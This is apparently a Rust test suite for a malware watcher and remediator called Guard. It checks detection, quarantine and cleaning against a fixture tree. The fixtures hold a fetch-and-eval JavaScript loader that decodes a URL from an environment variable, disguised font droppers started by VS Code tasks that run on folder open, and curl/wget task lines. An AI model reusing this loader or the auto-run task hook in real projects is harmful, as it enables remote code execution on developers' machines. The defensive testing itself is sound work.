//! `guard watch`: single passes (`--once`), arguments and the service mode,
//! checked against goldens recorded from watcher.py (Python). Was
//! tests/test_rust_watch.py, which ran both builds side by side.
//!
//! What a pass reports is compared in full: log lines, alerts, the cleaned
//! tree, quarantine index and backups, and the snapshot database (paths and
//! generations; mtimes are the moment each tree was written). The walk visits
//! directories in the file system's order, so lines, alerts and index records
//! are sorted before comparing. The service (events and polling until SIGTERM)
//! is compared on what it detects and cleans, since its timing varies.

mod common;

use std::fs;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use common::samples::eicar;
use common::*;
use serde_json::{json, Map, Value};
use sha2::Digest;

const SUITE: &str = "watch";

// The incident's loader, split so no source line carries it whole (Guard scans
// its own repository).
const PAYLOAD: &str = concat!(
    "(async () => {\n",
    "  const src = atob(process.env.AUTH_API_KEY);\n",
    "  const proxyInfo = await (await fetch(src)).text();\n",
    "  eval(proxy",
    "Info);\n",
    "})();\n"
);
const EVAL: &str = concat!("eval(proxy", "Info)");

const TASKS: &str = r#"{
  // JSONC: comments and trailing commas
  "version": "2.0.0",
  "tasks": [
    {"label": "dev", "command": "npm", "args": ["run", "dev"],},
    {"label": "boot", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-400.woff2"],
     "runOptions": {"runOn": "folderOpen"}},
    {"label": "top-level", "command": ["sh", "-c"], "args": "curl", "runOn": "folderOpen"},
    {"label": "quiet", "command": "make", "runOptions": {"runOn": "folderOpen"}},
    {"label": "fetch", "command": "true", "args": ["wget http://x/a.woff"]},
    "not a task",
    {"label": "num", "command": 3.0, "args": [1, null, true]},
  ],
}
"#;

const ISO_TS: &str = r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d{6})?\+00:00";

fn sha(b: &[u8]) -> String {
    sha2::Sha256::digest(b)
        .iter()
        .map(|x| format!("{x:02x}"))
        .collect()
}

fn quiet() -> Map<String, Value> {
    match json!({"notify": false, "telemetry_sec": 0, "update_check_sec": 0}) {
        Value::Object(m) => m,
        _ => unreachable!(),
    }
}

// ---------------------------------------------------------------- corpus
/// A watched tree: downloads, repos, excluded and deep folders.
fn watched(root: &Path) {
    let dl = root.join("Downloads");
    write(&dl.join("invoice.js"), format!("const a = 1;\n{PAYLOAD}")); // critical, loose file
    write(&dl.join("notes.json"), "{\"ok\": true}\n"); // clean, scanned
    write(&dl.join("eicar.com"), eicar()); // not a watched extension
    write(
        &dl.join("fa-solid-400.woff2"),
        "const x = require('child_process');\n",
    ); // disguised dropper
    write(
        &dl.join("real.woff2"),
        [b"wOF2".as_slice(), &[0u8; 64]].concat(),
    );
    write(&dl.join("font.ttf"), format!("function f() {{ {EVAL} }}\n")); // bad magic, text
    write(&dl.join("\u{e9}t\u{e9}.ts"), "// caf\u{e9}\n");
    // a clone: .git plus an infected tree
    let repo = root.join("Projects/app");
    fs::create_dir_all(repo.join(".git/refs")).unwrap();
    write(&repo.join(".git/HEAD"), "ref: refs/heads/main\n");
    write(&repo.join(".git/objects/ab/cdef"), b"\x00blob");
    write(
        &repo.join("src/server.ts"),
        format!("import express from 'express';\n\n{PAYLOAD}\nexport const app = express();\n"),
    );
    write(
        &repo.join("public/fonts/fa-solid-400.woff2"),
        "global['!']='9'; module.exports = 1;\n",
    );
    write(&repo.join(".vscode/tasks.json"), TASKS);
    write(
        &repo.join(".vscode/settings.json"),
        "{\"task.allowAutomaticTasks\": true}\n",
    );
    write(
        &repo.join(".github/workflows/ci.yml"),
        format!("run: node ./public/fonts/x.js && {EVAL}\n"),
    );
    write(&repo.join("tools/e.com"), eicar());
    // a clean repo, and a loose folder that is not one
    let clean = root.join("Projects/clean");
    fs::create_dir_all(clean.join(".git")).unwrap();
    write(&clean.join("index.js"), "module.exports = 1;\n");
    write(&root.join("Projects/loose/x.js"), "console.log(1)\n");
    // dependencies are scanned as a whole (never walked file by file);
    // excluded and too-deep paths are never seen
    write(&root.join("Projects/node_modules/evil/index.js"), PAYLOAD);
    write(&root.join("Desktop/a/b/c/d/e/f/g/deep.js"), PAYLOAD);
    write(&root.join("Desktop/a/b/c/d/e/edge.js"), PAYLOAD);
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(root.join("Downloads"), root.join("Desktop/dl-link")).unwrap();
        symlink(root.join("missing.js"), root.join("Desktop/broken.js")).unwrap();
    }
}

fn one_file(d: &Path) {
    write(&d.join("x.js"), format!("{EVAL}\n"));
}

// ---------------------------------------------------------------- state
/// Files under `root` (links followed, as Path.is_file()): posix path -> sha256.
fn tree(root: &Path) -> String {
    let mut out = Vec::new();
    fn walk(base: &Path, d: &Path, out: &mut Vec<(String, String)>) {
        let Ok(rd) = fs::read_dir(d) else { return };
        for e in rd.flatten() {
            let p = e.path();
            let ft = e.file_type().unwrap();
            if ft.is_dir() {
                walk(base, &p, out);
            } else if p.is_file() {
                let rel = p
                    .strip_prefix(base)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/");
                out.push((rel, sha(&fs::read(&p).unwrap())));
            }
        }
    }
    walk(root, root, &mut out);
    out.sort();
    out.iter().map(|(p, h)| format!("{p}  {h}\n")).collect()
}

/// The remediator's safe_name of a path.
fn safe(p: &Path) -> String {
    let s: String = s(p)
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "._-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    s.trim_matches('_').to_string()
}

/// A work tree `w` and its GUARD_HOME, in one scratch directory.
struct Watch {
    tmp: Tmp,
    work: PathBuf,
    home: PathBuf,
}

impl Watch {
    fn new(build: impl Fn(&Path), config: Option<Value>) -> Watch {
        let tmp = Tmp::new("watch");
        let work = tmp.join("w");
        build(&work);
        fs::create_dir_all(&work).unwrap();
        let home = tmp.join("home");
        fs::create_dir_all(&home).unwrap();
        if let Some(c) = config {
            let mut m = quiet();
            m.extend(c.as_object().unwrap().clone());
            write(
                &home.join("watcher.config.json"),
                Value::Object(m).to_string(),
            );
        }
        Watch { tmp, work, home }
    }

    fn norm(&self) -> Norm {
        Norm::new()
            .lit(&safe(&self.work), "<SAFE-W>")
            .path(&self.work, "W")
            .path(&self.home, "HOME")
            .path(&self.tmp.path, "TMP")
            .re(r"\d{8}T\d{6}Z", "TS")
    }

    fn cmd(&self, args: &[&str]) -> Guard {
        let mut a = vec!["watch".to_string()];
        a.extend(args.iter().map(|x| x.replace("{w}", &s(&self.work))));
        guard(&a).home(&self.home).env("PYTHONIOENCODING", "utf-8")
    }

    fn run(&self, args: &[&str]) -> Out {
        self.cmd(args).run()
    }

    /// Log lines without their timestamps, sorted (the walk order is the file
    /// system's).
    fn lines(&self, s: &str) -> String {
        let ts = regex::Regex::new(&format!("^{ISO_TS}  ")).unwrap();
        let mut v: Vec<String> = s
            .lines()
            .map(|l| {
                assert!(ts.is_match(l), "a log line without a timestamp: {l:?}");
                self.norm().apply(&ts.replace(l, ""))
            })
            .collect();
        v.sort();
        v.iter().map(|l| format!("{l}\n")).collect()
    }

    fn jsonl(&self, f: &Path) -> String {
        let n = self.norm();
        let ts_re = regex::Regex::new(&format!("^{ISO_TS}$")).unwrap();
        let Ok(t) = fs::read_to_string(f) else {
            return String::new();
        };
        let mut recs: Vec<String> = t
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|line| {
                let mut r: Value = parse_json(line);
                if let Some(ts) = r.as_object_mut().and_then(|m| m.shift_remove("ts")) {
                    let ts = ts.as_str().unwrap_or_default().to_string();
                    assert!(ts_re.is_match(&ts), "{ts}");
                }
                n.apply(&canon_json(&r))
            })
            .collect();
        recs.sort();
        recs.concat()
    }

    fn alerts(&self) -> String {
        self.jsonl(&self.home.join("alerts.jsonl"))
    }

    fn index(&self) -> String {
        self.jsonl(&self.home.join("quarantine/index.jsonl"))
    }

    fn backups(&self) -> String {
        let n = self.norm();
        let mut v = Vec::new();
        if let Ok(rd) = fs::read_dir(self.home.join("quarantine")) {
            for e in rd.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                if name.ends_with(".bak") {
                    v.push(format!(
                        "{}  {}\n",
                        n.apply(&name),
                        sha(&fs::read(e.path()).unwrap())
                    ));
                }
            }
        }
        v.sort();
        v.concat()
    }

    /// Everything a --once pass leaves behind.
    fn state(&self, out: &Out) -> String {
        let n = self.norm();
        // the log has every run so far; this one is its tail
        let log = self.home.join("watcher.log");
        if let Ok(l) = fs::read_to_string(&log) {
            assert!(
                l.replace("\r\n", "\n").ends_with(&out.stdout),
                "the log does not end with this run's output"
            );
        }
        format!(
            "exit {}\n--- stdout\n{}--- stderr\n{}--- tree\n{}--- alerts\n{}--- index\n{}--- backups\n{}--- snapshot\n{}",
            out.code,
            self.lines(&out.stdout),
            n.apply(&out.stderr),
            tree(&self.work),
            self.alerts(),
            self.index(),
            self.backups(),
            snapshot(&self.home, &n, false),
        )
    }
}

/// The snapshot database: rows (path, generation, and the mtime when asked)
/// sorted by path, then the meta table.
fn snapshot(home: &Path, n: &Norm, mtimes: bool) -> String {
    let db = home.join("watcher.snapshot.db");
    if !db.exists() {
        return String::new();
    }
    let con =
        rusqlite::Connection::open_with_flags(&db, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
            .unwrap();
    let mut rows: Vec<String> = con
        .prepare("SELECT path, mtime, gen FROM paths")
        .unwrap()
        .query_map([], |r| {
            Ok((
                r.get::<_, String>(0)?,
                r.get::<_, f64>(1)?,
                r.get::<_, i64>(2)?,
            ))
        })
        .unwrap()
        .map(|r| {
            let (p, m, g) = r.unwrap();
            if mtimes {
                format!("{}  {m}  {g}\n", n.apply(&p))
            } else {
                format!("{}  {g}\n", n.apply(&p))
            }
        })
        .collect();
    rows.sort();
    let mut meta: Vec<String> = con
        .prepare("SELECT k, v FROM meta")
        .unwrap()
        .query_map([], |r| {
            Ok(format!(
                "meta {} = {:?}\n",
                r.get::<_, String>(0)?,
                r.get::<_, Option<i64>>(1)?
            ))
        })
        .unwrap()
        .map(|r| r.unwrap())
        .collect();
    meta.sort();
    rows.concat() + &meta.concat()
}

// ------------------------------------------------------------ --once passes
#[test]
fn once_over_a_tree() {
    for (i, config) in [
        json!({}),
        json!({"remediate": false}),
        json!({"max_depth": 2, "exclude_dir_names": ["Downloads"]}),
        json!({"scan_new_files_ext": [".com", ".TS"], "max_changes_per_pass": 3}),
    ]
    .into_iter()
    .enumerate()
    {
        let w = Watch::new(watched, Some(config));
        let first = w.run(&["--once", "--roots", "{w}"]);
        let mut all = format!("=== first\n{}", w.state(&first));
        // a second pass finds nothing new (nothing was primed: --once compares
        // to the last pass)
        let second = w.run(&["--once", "--roots", "{w}"]);
        all.push_str(&format!("=== second\n{}", w.state(&second)));
        golden(SUITE, &format!("once_over_a_tree-{i}"), &all);
    }
}

#[test]
fn once_with_several_roots() {
    let w = Watch::new(watched, Some(json!({"repo_debounce_sec": 0})));
    let out = w.run(&[
        "--once",
        "--roots",
        "{w}/Downloads",
        "{w}/Projects",
        "{w}/Projects/app",
        "{w}/nowhere",
    ]);
    golden(SUITE, "once_with_several_roots", &w.state(&out));
}

/// New, modified and deleted paths after the first pass, and git activity.
#[test]
fn changes_between_passes() {
    let w = Watch::new(
        watched,
        Some(json!({"remediate": false, "repo_debounce_sec": 0})),
    );
    let first = w.run(&["--once", "--roots", "{w}"]);
    let mut all = format!("=== first\n{}", w.state(&first));
    let r = &w.work;
    write(&r.join("Downloads/new.mjs"), format!("{EVAL}\n"));
    fs::remove_file(r.join("Downloads/notes.json")).unwrap();
    let f = r.join("Downloads/invoice.js");
    let m = fs::metadata(&f).unwrap().modified().unwrap();
    fs::File::options()
        .write(true)
        .open(&f)
        .unwrap()
        .set_modified(m + Duration::from_secs(10))
        .unwrap();
    write(&r.join("Projects/clean/.git/FETCH_HEAD"), "abc\n");
    write(&r.join("Projects/clean/lib/a.js"), format!("{EVAL}\n"));
    write(&r.join("Projects/loose/.git/HEAD"), "ref: x\n");
    let second = w.run(&["--once", "--roots", "{w}"]);
    all.push_str(&format!("=== second\n{}", w.state(&second)));
    golden(SUITE, "changes_between_passes", &all);
}

#[test]
fn quarantine_hook() {
    let hook = if WINDOWS {
        json!([
            "python",
            "-c",
            "import sys; open(sys.argv[1] + '.hooked', 'w').close()"
        ])
    } else {
        json!(["sh", "-c", "touch \"$0.hooked\""])
    };
    let w = Watch::new(
        one_file,
        Some(json!({"remediate": false, "quarantine_cmd": hook})),
    );
    let out = w.run(&["--once", "--roots", "{w}"]);
    assert!(w.work.join("x.js.hooked").exists());
    let mut all = format!("=== hook\n{}", w.state(&out));
    let w = Watch::new(
        one_file,
        Some(json!({"remediate": false, "quarantine_cmd": ["/no/such/hook"]})),
    );
    let out = w.run(&["--once", "--roots", "{w}"]);
    all.push_str(&format!("=== missing hook\n{}", w.state(&out)));
    golden(SUITE, "quarantine_hook", &all);
}

/// No --roots: the config's, or the default ~/Projects, ~/Desktop, ...
/// (not on Windows: the default ~ roots mean every profile under C:\Users).
#[cfg(unix)]
#[test]
fn config_files() {
    for (i, cfg) in ["{not json", "", r#"{"watch_roots": []}"#]
        .into_iter()
        .enumerate()
    {
        let w = Watch::new(watched, None);
        write(&w.home.join("watcher.config.json"), cfg);
        let out = w.cmd(&["--once"]).env("HOME", &w.work).run();
        golden(SUITE, &format!("config_files-{i}"), &w.state(&out));
    }
}

/// A machine switching builds keeps its snapshot: the binary reads the
/// database Python wrote, and sees only what changed since. (Python ran each
/// build after the other; here the first pass's database is rewritten with
/// snapshot_store.py's own schema statements before the second pass.)
#[test]
fn snapshot_carries_across_builds() {
    let tmp = Tmp::new("carry");
    let d = tmp.join("tree");
    watched(&d);
    let n = Norm::new().path(&d, "W").path(&tmp.path, "TMP");
    let mut cfg = quiet();
    cfg.insert("remediate".into(), json!(false));
    let first = tmp.join("first");
    write(
        &first.join("watcher.config.json"),
        Value::Object(cfg).to_string(),
    );
    let run = |home: &Path| {
        guard(&["watch", "--once", "--roots", &s(&d)])
            .home(home)
            .env("PYTHONIOENCODING", "utf-8")
            .run()
    };
    let r = run(&first);
    assert_eq!(r.code, 0, "{}", r.stderr);
    // the database as snapshot_store.py creates it
    let home = tmp.join("then");
    fs::create_dir_all(&home).unwrap();
    fs::copy(
        first.join("watcher.config.json"),
        home.join("watcher.config.json"),
    )
    .unwrap();
    {
        let src = rusqlite::Connection::open(first.join("watcher.snapshot.db")).unwrap();
        let dst = rusqlite::Connection::open(home.join("watcher.snapshot.db")).unwrap();
        dst.query_row("PRAGMA journal_mode=WAL", [], |_| Ok(()))
            .unwrap();
        dst.execute_batch(concat!(
            "PRAGMA synchronous=NORMAL;",
            "CREATE TABLE IF NOT EXISTS paths (",
            "path TEXT PRIMARY KEY, mtime REAL NOT NULL, gen INTEGER NOT NULL);",
            "CREATE TABLE IF NOT EXISTS meta (k TEXT PRIMARY KEY, v INTEGER);"
        ))
        .unwrap();
        let mut q = src.prepare("SELECT path, mtime, gen FROM paths").unwrap();
        let rows: Vec<(String, f64, i64)> = q
            .query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
            .unwrap()
            .map(|r| r.unwrap())
            .collect();
        for (p, m, g) in rows {
            dst.execute(
                "INSERT INTO paths(path,mtime,gen) VALUES(?,?,?)",
                rusqlite::params![p, m, g],
            )
            .unwrap();
        }
        let gen: i64 = src
            .query_row("SELECT v FROM meta WHERE k='gen'", [], |r| r.get(0))
            .unwrap();
        dst.execute("INSERT INTO meta(k,v) VALUES('gen',?)", [gen])
            .unwrap();
    }
    write(&d.join("Downloads/later.js"), format!("{EVAL}\n"));
    fs::remove_file(d.join("Downloads/notes.json")).unwrap();
    let r = run(&home);
    assert_eq!(r.code, 0, "{}", r.stderr);
    let ts = regex::Regex::new(&format!("(?m)^{ISO_TS}  ")).unwrap();
    let log = ts.replace_all(&r.stdout, "").into_owned();
    assert!(
        log.contains("later.js") && !log.contains("Projects"),
        "{log}"
    );
    let mut lines: Vec<&str> = log.lines().collect();
    lines.sort();
    golden(
        SUITE,
        "snapshot_carries_across_builds",
        &format!(
            "--- stdout\n{}--- snapshot\n{}",
            n.apply(&lines.iter().map(|l| format!("{l}\n")).collect::<String>()),
            snapshot(&home, &n, false)
        ),
    );
}

// ------------------------------------------------------------- arguments
#[test]
fn usage() {
    let cases: Vec<Vec<&str>> = vec![
        vec!["--print-default-config"],
        vec!["--p"],
        vec!["-h"],
        vec!["--help"],
        vec!["--he"],
        vec!["-hx"],
        vec!["x"],
        vec!["-"],
        vec!["-x"],
        vec!["-1"],
        vec!["--", "x"],
        vec!["--roots", "--", "a"],
        vec!["--once=1"],
        vec!["--print-default-config=x"],
        vec!["--interval"],
        vec!["--interval", "x"],
        vec!["--interval", "--once"],
        vec!["--interval=1_0", "--p"],
        vec!["--i", " 2 ", "--p"],
        vec!["--interval", "1__0"],
        vec!["--interval", "inf", "--p"],
        vec!["--roots=a", "b"],
        vec!["--roots", "a", "-1", "--bogus"],
        vec!["--nope", "--print-default-config"],
        vec!["--print-default-config", "--interval", "-5"],
    ];
    for (i, args) in cases.into_iter().enumerate() {
        let tmp = Tmp::new("usage");
        let mut a = vec!["watch"];
        a.extend(&args);
        let out = guard(&a).home(&tmp.join("home")).run();
        golden(
            SUITE,
            &format!("usage-{i}"),
            &format!("$ watch {}\n{}", args.join(" "), out.shown_all()),
        );
    }
}

// ---------------------------------------------------------------- service
/// A spawned watcher, killed when dropped (a failing test included).
struct Service {
    child: Option<std::process::Child>,
}

impl Service {
    fn start(w: &Watch, out: &Path, err: &Path) -> Service {
        let mut cmd = w.cmd(&["--roots", "{w}"]).command();
        cmd.stdin(std::process::Stdio::null())
            .stdout(fs::File::create(out).unwrap())
            .stderr(fs::File::create(err).unwrap());
        Service {
            child: Some(cmd.spawn().unwrap()),
        }
    }

    /// SIGTERM, then the exit code (killed after 60 s). Windows has no
    /// signal to send a console-less child, so there it is killed: None.
    fn stop(&mut self) -> Option<i32> {
        let mut c = self.child.take()?;
        #[cfg(windows)]
        {
            let _ = c.kill();
            let _ = c.wait();
            None
        }
        #[cfg(unix)]
        {
            unsafe {
                libc::kill(c.id() as i32, libc::SIGTERM);
            }
            let end = Instant::now() + Duration::from_secs(60);
            loop {
                if let Some(st) = c.try_wait().unwrap() {
                    return st.code();
                }
                if Instant::now() > end {
                    let _ = c.kill();
                    let _ = c.wait();
                    return None;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

impl Drop for Service {
    fn drop(&mut self) {
        if let Some(mut c) = self.child.take() {
            let _ = c.kill();
            let _ = c.wait();
        }
    }
}

fn wait_for(mut pred: impl FnMut() -> bool, secs: u64) -> bool {
    let end = Instant::now() + Duration::from_secs(secs);
    while Instant::now() < end {
        if pred() {
            return true;
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    pred()
}

fn read(p: &Path) -> String {
    fs::read_to_string(p).unwrap_or_default()
}

#[test]
fn service_detects_and_stops_native() {
    service_detects_and_stops(true);
}

#[test]
fn service_detects_and_stops_polling() {
    service_detects_and_stops(false);
}

fn service_detects_and_stops(native: bool) {
    let w = Watch::new(
        watched,
        Some(json!({"native_events": native, "poll_interval_sec": 0.5, "full_rescan_sec": 300})),
    );
    // an install whose first-start scan already ran: the tree is primed
    // silently and only what lands afterwards is scanned
    // (service_scans_existing_files_on_first_start covers the first start)
    write(&w.home.join("initial-scan.done"), "");
    let log = w.home.join("watcher.log");
    let (out, err) = (w.tmp.join("stdout"), w.tmp.join("stderr"));
    let mut svc = Service::start(&w, &out, &err);
    assert!(
        wait_for(|| read(&log).contains("primed "), 120),
        "{}",
        read(&log)
    );
    std::thread::sleep(Duration::from_millis(500));
    let r = &w.work;
    write(&r.join("Downloads/dropped.js"), format!("{EVAL}\n"));
    write(
        &r.join("Downloads/fa-solid-900.woff2"),
        "module.exports = require('x');\n",
    );
    let new = r.join("Projects/cloned");
    write(&new.join("src/app.ts"), format!("const a = 1;\n{PAYLOAD}"));
    fs::create_dir(new.join(".git")).unwrap();
    let alerts = w.home.join("alerts.jsonl");
    assert!(
        wait_for(
            || read(&alerts)
                .lines()
                .filter(|l| !l.trim().is_empty())
                .count()
                >= 3,
            120
        ),
        "{}",
        read(&log)
    );
    assert!(
        wait_for(|| read(&log).contains("remediated "), 120),
        "{}",
        read(&log)
    );
    // the loose dropper's quarantine follows the repo's remediation
    assert!(
        wait_for(
            || read(&log).contains("quarantined dropper") && read(&log).contains("fa-solid-900"),
            120
        ),
        "{}",
        read(&log)
    );
    std::thread::sleep(Duration::from_millis(1500));
    let code = svc.stop();
    // the log is written in text mode: CRLF on Windows
    let log_text = read(&log).replace("\r\n", "\n");
    // a clean stop needs SIGTERM (see Service::stop)
    if !WINDOWS {
        assert_eq!(code, Some(0), "{}", read(&err));
        assert!(log_text.contains("watcher stopped"), "{log_text}");
    }
    // the startup lines (memguard's numbers are per process)
    let ts = regex::Regex::new(&format!("(?m)^{ISO_TS}  ")).unwrap();
    let head = ts.replace_all(&log_text, "").into_owned();
    let head = head
        .split("priming baseline snapshot")
        .next()
        .unwrap()
        .to_string();
    let head = regex::Regex::new("memguard: .*")
        .unwrap()
        .replace_all(&head, "memguard")
        .into_owned();
    // inotify on Linux, where the goldens were recorded; other back ends
    // name themselves and count watches differently
    let head = if cfg!(target_os = "linux") {
        head
    } else {
        regex::Regex::new("native file events: .*")
            .unwrap()
            .replace_all(
                &head,
                "native file events: inotify, 24 watch(es); full rescan every 300s",
            )
            .into_owned()
    };
    // alerts by kind, path and findings
    let mut al: Vec<String> = read(&alerts)
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| {
            let v = parse_json(l);
            w.norm().apply(&format!(
                "{}  {}  {}\n",
                v["kind"].as_str().unwrap(),
                v["path"].as_str().unwrap(),
                v["findings"]
            ))
        })
        .collect();
    al.sort();
    golden(
        SUITE,
        &format!(
            "service_detects_and_stops-{}",
            if native { "native" } else { "polling" }
        ),
        &format!(
            "--- startup\n{}--- alerts\n{}--- tree\n{}--- index\n{}",
            w.norm().apply(&head),
            al.concat(),
            tree(&w.work),
            w.index(),
        ),
    );
}

/// A machine infected before Guard was installed: the first start scans and
/// cleans what is already in the watch roots, and later starts don't repeat it.
#[test]
fn service_scans_existing_files_on_first_start() {
    let w = Watch::new(
        watched,
        Some(json!({"native_events": true, "poll_interval_sec": 0.5, "full_rescan_sec": 300})),
    );
    let log = w.home.join("watcher.log");
    let alerts = w.home.join("alerts.jsonl");
    let marker = w.home.join("initial-scan.done");
    let (out, err) = (w.tmp.join("stdout"), w.tmp.join("stderr"));
    let mut svc = Service::start(&w, &out, &err);
    assert!(
        wait_for(|| read(&log).contains("initial scan complete"), 300),
        "{}",
        read(&log)
    );
    svc.stop();
    let text = read(&log);
    assert!(!text.contains("priming baseline snapshot"), "{text}");
    assert!(marker.exists(), "{text}");
    let found = read(&alerts);
    let dl = w.work.join("Downloads");
    // the loose loader, the EICAR file (not a scan_new_files_ext type, so the
    // antivirus engine alone) and the disguised font dropper, and the
    // infected clone
    for p in [
        dl.join("invoice.js"),
        dl.join("eicar.com"),
        dl.join("fa-solid-400.woff2"),
        w.work.join("Projects").join("app"),
    ] {
        let p = serde_json::to_string(&p.to_string_lossy()).unwrap();
        assert!(found.contains(&p), "no alert for {p}:\n{found}\n{text}");
    }
    // dependencies are scanned and cleaned too
    let nm = serde_json::to_string(
        &w.work
            .join("Projects")
            .join("node_modules")
            .to_string_lossy(),
    )
    .unwrap();
    assert!(found.contains(&nm), "no alert for {nm}:\n{found}\n{text}");
    let dep = read(&w.work.join("Projects/node_modules/evil/index.js"));
    assert!(!dep.contains(EVAL), "{dep}");
    // nothing outside the watch scope: too-deep paths
    assert!(!found.contains("deep.js"), "{found}");
    // cleaned: the whole-file threats are gone, the clone's code was excised
    assert!(!dl.join("eicar.com").exists(), "{text}");
    assert!(!dl.join("fa-solid-400.woff2").exists(), "{text}");
    let server = read(&w.work.join("Projects/app/src/server.ts"));
    assert!(server.contains("export const app"), "{server}");
    assert!(!server.contains(EVAL), "{server}");

    // the next start doesn't scan everything again: the cleaned loose files
    // aren't re-alerted (the repo's remaining findings, such as its workflow,
    // are, as after any remediation, once its changed files are rescanned)
    let n = found.len();
    let mut svc = Service::start(&w, &out, &err);
    assert!(
        wait_for(
            || read(&log).matches("native file events").count() >= 2,
            120
        ),
        "{}",
        read(&log)
    );
    std::thread::sleep(Duration::from_millis(2000));
    svc.stop();
    let text = read(&log);
    assert_eq!(text.matches("initial scan:").count(), 1, "{text}");
    let later = &read(&alerts)[n..];
    assert!(!later.contains("Downloads"), "{later}\n{text}");
}
